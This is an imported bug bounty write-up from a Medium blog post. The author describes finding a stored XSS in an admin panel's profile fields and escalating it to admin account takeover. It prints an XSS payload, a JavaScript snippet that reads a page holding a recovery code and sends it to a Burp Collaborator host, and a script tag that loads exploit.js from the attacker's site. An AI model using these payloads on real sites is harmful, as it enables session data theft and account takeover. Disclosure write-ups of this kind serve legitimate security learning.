---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-11-01_how-i-made-500-with-xss.md
original_filename: 2021-11-01_how-i-made-500-with-xss.md
title: How i made 500$ with XSS
category: documents
detected_topics:
- xss
- command-injection
- api-security
tags:
- imported
- documents
- xss
- command-injection
- api-security
language: en
raw_sha256: 58179c0e2595b048cbfac88eedcb7f1c5e82c7b2a059600df17805972cd8f198
text_sha256: 3d2ee893c3ff1d6aa240f68fc62dd47ce37c257f82f75e172f3034ee5ff49b81
ingested_at: '2026-06-28T07:32:08Z'
sensitivity: unknown
redactions_applied: false
---

# How i made 500$ with XSS

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-11-01_how-i-made-500-with-xss.md
- Source Type: markdown
- Detected Topics: xss, command-injection, api-security
- Ingested At: 2026-06-28T07:32:08Z
- Redactions Applied: False
- Raw SHA256: `58179c0e2595b048cbfac88eedcb7f1c5e82c7b2a059600df17805972cd8f198`
- Text SHA256: `3d2ee893c3ff1d6aa240f68fc62dd47ce37c257f82f75e172f3034ee5ff49b81`


## Content

---
title: "How i made 500$ with XSS"
url: "https://nassimchami.medium.com/stored-xss-to-account-take-over-45a7e09116a7"
authors: ["Nassim Chami (@nvccim)"]
bugs: ["XSS", "Account takeover"]
bounty: "500"
publication_date: "2021-11-01"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3199
scraped_via: "browseros"
---

# How i made 500$ with XSS

Top highlight

How i made 500$ with XSS
Nassim Chami
Follow
4 min read
·
Nov 1, 2021

257

2

Hi Hackers, Hope you all are safe. today we have another writeup and it’s about my interesting finding on a private program where I was able to completely takeover admins accounts just by click to show my profile picture.

Get Nassim Chami’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

So let’s start, i was get invitation from private web application program lets called redacted.net, so the web application look like admin panel experimental in order to manage users, groups and create articles, so login page look like that with two features, first new admins can access to there admin panel using access code. secondly, exist admins can access to admin panel using their email and password, for me i was got my credentials from the programs to login.

Press enter or click to view image in full size

After login, directly i move to account settings, so settings page have many inputs that was interesting so i tested all of them (except email input) with simple HTML code <h1>test</h1>, i save it and refresh page .

Press enter or click to view image in full size

i notice H1 tag disappeared from all input and i don’t know where reflect, also i open other account to see if reflected but nothing found .

Press enter or click to view image in full size

So after many a hours of searching without result i decide to move on other feature, so i go to test in profile picture vulnerable to XSS , i change my profile picture with PNG image contain XSS payload, i save it and click to view, the XSS image don’t reflected but i see the other inputs is reflected in this page .

Press enter or click to view image in full size

I was so happy and i change HTML code to this XSS payload :

><img src=”https://media.geeksforgeeks.org/wp-content/uploads/20190516152959/Cross-Site-ScriptingXSS.png" onload=alert(11)>

and the XSS payload reflect successfully

Press enter or click to view image in full size

The story not finish because after some hours of reporting, the program send message to us describe that XSS vulnerabilities is out of scope

Press enter or click to view image in full size
:(

After this message i confused but i decided to escalate XSS to high impact, first thing i test if i can access to cookie unfortunately i can’t, because httpOnly is enable so i can’t access to it using JS code

Press enter or click to view image in full size
i got null result using document.cookie event

for now i open my BurpSuite and analyze requests and responses, after while time i found something interesting in response

Press enter or click to view image in full size

The interesting thing i found is RecoveryCode reflected in the response and other important information, so the scenario which coming to my mind is if i can access this page using JS code i can use this code in order to take over accounts, after a while i wrote this payload

var Http = new XMLHttpRequest();
var url=’https://redacted.com/profile';
Http.open(“GET”, url);
Http.send();

var burp =’https://burp-collaborator/test.php?id=' + Http.responseText ;
Http.onreadystatechange = (e) => {
Http.open(“GET”, burp);
Http.send();
}

the role of this JS code is send GET request to the interesting page, also send GET request to my burp collaborator plus the response of the interesting page, so i upload my JS code in my website and i use this payload in vulnerable input to run my JS code .

“><script src=”https://mywebsite.com/exploit.js” ><script>

Press enter or click to view image in full size
burp collab after run JS code

As you can see i have successfully to access the Recovery Code plus other information, and i can use it to register as new admin and change his password because the code not expire .

Note : the recovery code is the same code when admin add new admin, and he get this code in his email to register

Bug Timeline :

Reported : 21 sep 2021
Triaged : 29 sep 2021
Reward : 29 sep 2021

Thank you for reading, see you in next blog .

My twitter : https://www.twitter.com/nvccim
